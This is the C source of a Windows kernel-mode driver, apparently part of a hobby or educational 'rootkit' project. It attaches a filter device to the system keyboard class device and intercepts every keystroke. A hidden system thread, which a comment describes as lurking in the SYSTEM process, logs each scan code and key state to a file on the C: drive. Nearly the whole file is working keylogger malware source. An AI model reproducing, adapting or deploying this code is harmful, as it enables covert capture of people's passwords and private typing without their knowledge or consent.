#include <ntddk.h>
#include <stdio.h>
#include <ntddkbd.h>
#include "ntddkbd.h"
#include "rootkit.h"
#include "rk_keyboard.h"
//#include <ntstrsafe.h>
//#include "ScanCode.h"

extern ULONG gp_NumPendingIrps;

#define STRING_FORMAT "%d:%x:%x "

VOID KeyLoggerThreadProc(IN PVOID pContext);

//--------------------------------------------------------------------------------------//
//	Setupkeylogger
//--------------------------------------------------------------------------------------//
//
//	Sets up driver enviroment to handle keyloging
//
//	PDEVICE *deviceObject - this is keyboard device
//--------------------------------------------------------------------------------------//
BOOLEAN SetupKeylogger(PDEVICE_OBJECT deviceObject)
{
	PROOTKIT_EXT devExt = (PROOTKIT_EXT)deviceObject->DeviceExtension;
	BOOLEAN ret;
	HANDLE hThread;
	NTSTATUS status;

	IO_STATUS_BLOCK file_status;
	OBJECT_ATTRIBUTES obj_attrib;
	CCHAR		 ntNameFile[64] = "\\DosDevices\\c:\\myRootkit.txt";
    STRING		 ntNameString;
	UNICODE_STRING uFileName;

//	DbgPrint( "Setup devExt: %x", devExt );

	// we have to prepare double linked list 
	InitializeListHead( &devExt->listHead );
//	DbgPrint("Setup A listHead: %x",&devExt->listHead);

	// spin lock will defend atomicy of list
	KeInitializeSpinLock( &devExt->spinlock );
//	DbgPrint("Setup A spinlock: %x",&devExt->spinlock);

	// this will tell us when to fetch key buffer
	KeInitializeSemaphore( &devExt->semaphore, 0, MAXLONG );

	// thread setup routines
	devExt->bThreadRunning = TRUE;

	//this is a system thread, look for it in a SYSTEM(8) process ;)
	status = PsCreateSystemThread( &hThread, 
									(ACCESS_MASK) 0L ,	
									NULL,	//object attributes
									NULL,	//process handle
									NULL,	//pointer to tid structure 
									KeyLoggerThreadProc,	// :)
									devExt	//argument passed
									);
	if (status != STATUS_SUCCESS) {
		ret =  FALSE;
		goto gt_exit;
	}

	DbgPrint("Worker thread created!\n");

	status = ObReferenceObjectByHandle( hThread,
										THREAD_ALL_ACCESS,
										NULL,
										KernelMode,
										(PVOID)&devExt->pThread,
										NULL
										);

	if (status != STATUS_SUCCESS) {
		ret = FALSE;
		goto gt_free;
	}

    RtlInitAnsiString( &ntNameString, ntNameFile);
    RtlAnsiStringToUnicodeString(&uFileName, &ntNameString, TRUE );
	InitializeObjectAttributes(&obj_attrib, &uFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);
	status = ZwCreateFile(&devExt->hLogFile,GENERIC_WRITE,&obj_attrib,&file_status,
							NULL,FILE_ATTRIBUTE_NORMAL,0,FILE_OPEN_IF,FILE_SYNCHRONOUS_IO_NONALERT,NULL,0);
	RtlFreeUnicodeString(&uFileName);

	if (status != STATUS_SUCCESS)
	{
		DbgPrint("Failed to create log file...\n");
		DbgPrint("File Status = %x\n",file_status);
	}
	else
	{
		DbgPrint("Successfully created log file...\n");
		DbgPrint("File Handle = %x\n",devExt->hLogFile);
	}

gt_free:
	ZwClose( hThread );

gt_exit:
	return ret;
}

//--------------------------------------------------------------------------------------//
//	Thread procedure	
//--------------------------------------------------------------------------------------//
//
//	Becouse we cannot make IO operation being in KeyboardReadComplete (DISPATCH_LEVEL)
//	this worker thread is fired to do this job.
//
//	PVOID pContext	pointer to device extension of keyboard device
//--------------------------------------------------------------------------------------//
VOID KeyLoggerThreadProc(IN PVOID pContext)
{
	PROOTKIT_EXT devExt = (PROOTKIT_EXT)pContext;
	PDEVICE_OBJECT pKeyboardDevice = devExt->PrevDevice;

	PLIST_ENTRY pListEntry;
	KEY_DATA* kData;
	NTSTATUS status;
	char keys[3] = {0};
	char data[16] = {0};

//	DbgPrint("Thread DevExt: %x",devExt);

	keys[1] = 0;
	while(TRUE) {
		KeWaitForSingleObject(&devExt->semaphore, Executive, KernelMode, FALSE, NULL);
		pListEntry = ExInterlockedRemoveHeadList(&devExt->listHead,	&devExt->spinlock);				

		if( devExt->bThreadRunning == FALSE)
		{
			PsTerminateSystemThread( STATUS_SUCCESS );
		}
//		DbgPrint("pListEntry %x\n",pListEntry);

		kData = CONTAINING_RECORD(pListEntry,KEY_DATA,ListEntry);
		keys[0] = kData->KeyData;
		keys[1] = kData->KeyFlags;
		keys[2] = 0;
		//Convert the scan code to a key code
		if( devExt->hLogFile != NULL) //make sure our file handle is valid
		{	
			IO_STATUS_BLOCK io_status;
//			DbgPrint("Writing scan code to file...\n");

			status = ZwWriteFile(devExt->hLogFile,NULL,NULL,NULL,
				&io_status,&keys,strlen(keys),NULL,NULL);

			if(status != STATUS_SUCCESS)
				DbgPrint("Error writing scan code to file...\n");
			DbgPrint("KEYLOG: Scan CODE: (%d), STATE: (%s)\n",keys[0],keys[1]?"UP":"DOWN");
		}


	}
}

NTSTATUS KeyboardInit(IN PDRIVER_OBJECT DriverObject, PDEVICE_OBJECT *deviceObject)
{
    CCHAR		      ntNameBuffer[64];
    STRING		      ntNameString;
    UNICODE_STRING    ntUnicodeString;
    PDEVICE_OBJECT    device;
    NTSTATUS          status;
    PROOTKIT_EXT	  devExt;
    WCHAR             messageBuffer[]  = L"Ctrl2cap Initialized\n";
    UNICODE_STRING    messageUnicodeString;

    sprintf( ntNameBuffer, "\\Device\\KeyboardClass0" );
    RtlInitAnsiString( &ntNameString, ntNameBuffer );
    RtlAnsiStringToUnicodeString( &ntUnicodeString, &ntNameString, TRUE );

    status = IoCreateDevice( DriverObject,
                             sizeof(ROOTKIT_EXT),
                             NULL,
                             FILE_DEVICE_KEYBOARD,
                             0,
                             FALSE,
                             &device );

    if( !NT_SUCCESS(status) ) {

        DbgPrint(("Keyboard hook failed to create device!\n"));

        RtlFreeUnicodeString( &ntUnicodeString );
        return STATUS_SUCCESS;
    }

    RtlZeroMemory(device->DeviceExtension, sizeof(ROOTKIT_EXT));

    devExt = (PROOTKIT_EXT) device->DeviceExtension;

    device->Flags |= DO_BUFFERED_IO;
    device->Flags &= ~DO_DEVICE_INITIALIZING;

    //
    // Attach to the keyboard chain.
    //
    status = IoAttachDevice( device, &ntUnicodeString, &devExt->PrevDevice );

    if( !NT_SUCCESS(status) ) {

        DbgPrint(("Connect with keyboard failed!\n"));
        IoDeleteDevice( device );
        RtlFreeUnicodeString( &ntUnicodeString );
        return STATUS_SUCCESS;
    }

    RtlFreeUnicodeString( &ntUnicodeString );
    DbgPrint("Successfully connected to keyboard device\n");

	*deviceObject = device;	

    return STATUS_SUCCESS;
}


//
// becouse IRQL == DISPATCH_LEVEL we cannot perform IO operation or waiting in this code (BSOD)
// so our worker thread is notified about new data to fetch by simply incrementing semaphore count
//
NTSTATUS KeyboardReadComplete( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp, IN PVOID Context )
{
    PIO_STACK_LOCATION       IrpSp;
    PKEYBOARD_INPUT_DATA     KeyData;
    int                      numKeys, i;
	KEY_DATA* kData;
	PROOTKIT_EXT			 devExt; 

	devExt = (PROOTKIT_EXT)DeviceObject->DeviceExtension;

    IrpSp = IoGetCurrentIrpStackLocation( Irp );
    if( NT_SUCCESS( Irp->IoStatus.Status ) ) {

		KeyData = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;
        numKeys = (int) (Irp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA));

        for( i = 0; i < numKeys; i++ ) {

//            DbgPrint("ScanCode: %x ", KeyData[i].MakeCode );
//            DbgPrint("%s\n", KeyData[i].Flags ? "Up" : "Down" );

            //if( KeyData[i].MakeCode == LCONTROL) {

            //    KeyData[i].MakeCode = CAPS_LOCK;
            //} 

//			DbgPrint("Tring to allocate KEY_DATA\n");

			kData = (KEY_DATA*)ExAllocatePool(NonPagedPool,sizeof(KEY_DATA));
								
			//fill in kData structure with info from IRP
			kData->KeyData = (char)KeyData[i].MakeCode;
			kData->KeyFlags = (char)KeyData[i].Flags;

//			DbgPrint("Adding IRP to work queue...");
//			DbgPrint("KeyboardRead DevExt%x",devExt);
			ExInterlockedInsertTailList(&devExt->listHead, &kData->ListEntry, &devExt->spinlock);

			KeReleaseSemaphore(&devExt->semaphore, 0, 1, FALSE);
        }//end for
    }

    if( Irp->PendingReturned ) {
        IoMarkIrpPending( Irp );
    }

	gp_NumPendingIrps--;

    return Irp->IoStatus.Status;
}


NTSTATUS KeyBoardDispatchRead( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )
{
    PROOTKIT_EXT   devExt;
    PIO_STACK_LOCATION  currentIrpStack;
    PIO_STACK_LOCATION  nextIrpStack;

//	DbgPrint("KeyBoardDispatchRead deviceObject: %x\n",DeviceObject);

	devExt = (PROOTKIT_EXT) DeviceObject->DeviceExtension;
    currentIrpStack = IoGetCurrentIrpStackLocation(Irp);
    nextIrpStack = IoGetNextIrpStackLocation(Irp);    

    // Send IRP down the device stack
    *nextIrpStack = *currentIrpStack;

    // Set the completion callback
    IoSetCompletionRoutine( Irp, KeyboardReadComplete, 
                            DeviceObject, TRUE, TRUE, TRUE );

	gp_NumPendingIrps++;

    return IoCallDriver( devExt->PrevDevice, Irp );
}

// FALLOWING FUNCS ARE NOT USED...
// 

NTSTATUS KeyboardPower( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
    PROOTKIT_EXT   devExt;    
    devExt = (PROOTKIT_EXT) DeviceObject->DeviceExtension;

	DbgPrint("KeyboardPower\n");

    // Let the next power IRP out of the gate
    PoStartNextPowerIrp( Irp );
    
    // Pass this power IRP to the keyboard class driver
    IoSkipCurrentIrpStackLocation( Irp );
    
    return PoCallDriver( devExt->PrevDevice, Irp );
}

VOID KeyboardUnload( IN PDRIVER_OBJECT Driver)
{
	DbgPrint("KeyboardUnload\n");
    UNREFERENCED_PARAMETER(Driver);
    ASSERT(NULL == Driver->DeviceObject);
}

NTSTATUS KeyboardPnP( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )
{
    PROOTKIT_EXT				devExt; 
    PIO_STACK_LOCATION          irpStack;
    NTSTATUS                    status = STATUS_SUCCESS;
    KIRQL                       oldIrql;
    KEVENT                      event;        

	DbgPrint("KeyboardPnP\n");
    devExt = (PROOTKIT_EXT) DeviceObject->DeviceExtension;
    irpStack = IoGetCurrentIrpStackLocation(Irp);

    switch (irpStack->MinorFunction) {
    case IRP_MN_REMOVE_DEVICE:
        
        //
        // Detach from the target device after passing the IRP
        // down the devnode stack.
        //
		DbgPrint("IRP_MN_REMOVE_DEVICE\n");
        IoSkipCurrentIrpStackLocation(Irp);
        IoCallDriver(devExt->PrevDevice, Irp);

        IoDetachDevice(devExt->PrevDevice); 
        IoDeleteDevice(DeviceObject);

        status = STATUS_SUCCESS;
        break;

    case IRP_MN_SURPRISE_REMOVAL:

        //
        // Same as a remove device, but don't call IoDetach or IoDeleteDevice.
        //
		DbgPrint("IRP_MN_SURPRISE_REMOVAL\n");
        IoSkipCurrentIrpStackLocation(Irp);
        status = IoCallDriver(devExt->PrevDevice, Irp);
        break;

    case IRP_MN_START_DEVICE: 
    case IRP_MN_QUERY_REMOVE_DEVICE:
    case IRP_MN_QUERY_STOP_DEVICE:
    case IRP_MN_CANCEL_REMOVE_DEVICE:
    case IRP_MN_CANCEL_STOP_DEVICE:
    case IRP_MN_FILTER_RESOURCE_REQUIREMENTS: 
    case IRP_MN_STOP_DEVICE:
    case IRP_MN_QUERY_DEVICE_RELATIONS:
    case IRP_MN_QUERY_INTERFACE:
    case IRP_MN_QUERY_CAPABILITIES:
    case IRP_MN_QUERY_DEVICE_TEXT:
    case IRP_MN_QUERY_RESOURCES:
    case IRP_MN_QUERY_RESOURCE_REQUIREMENTS:
    case IRP_MN_READ_CONFIG:
    case IRP_MN_WRITE_CONFIG:
    case IRP_MN_EJECT:
    case IRP_MN_SET_LOCK:
    case IRP_MN_QUERY_ID:
    case IRP_MN_QUERY_PNP_DEVICE_STATE:
    default:
        //
        // Pass these through untouched
        //
        IoSkipCurrentIrpStackLocation(Irp);
        status = IoCallDriver(devExt->PrevDevice, Irp);
        break;
    }

    return status;
}

NTSTATUS KeyboardAddDevice( IN PDRIVER_OBJECT   Driver, IN PDEVICE_OBJECT   PDO )
{
    PROOTKIT_EXT	         devExt;
    IO_ERROR_LOG_PACKET      errorLogEntry;
    PDEVICE_OBJECT           device;
    NTSTATUS                 status = STATUS_SUCCESS;

	DbgPrint("KeyboardAddDevice\n");
    //
    // Create a filter device and attach it to the device stack.
    //
    status = IoCreateDevice(Driver,                   
                            sizeof(PROOTKIT_EXT), 
                            NULL,                    
                            FILE_DEVICE_KEYBOARD,   
                            0,                     
                            FALSE,                
                            &device              
                            );

    if (!NT_SUCCESS(status)) {

        return (status);
    }

    RtlZeroMemory(device->DeviceExtension, sizeof(PROOTKIT_EXT));

    devExt = (PROOTKIT_EXT) device->DeviceExtension;
    devExt->PrevDevice = IoAttachDeviceToDeviceStack(device, PDO);

    ASSERT(devExt->PrevDevice);

    device->Flags |= (DO_BUFFERED_IO | DO_POWER_PAGABLE);
    device->Flags &= ~DO_DEVICE_INITIALIZING;
    return status;
}
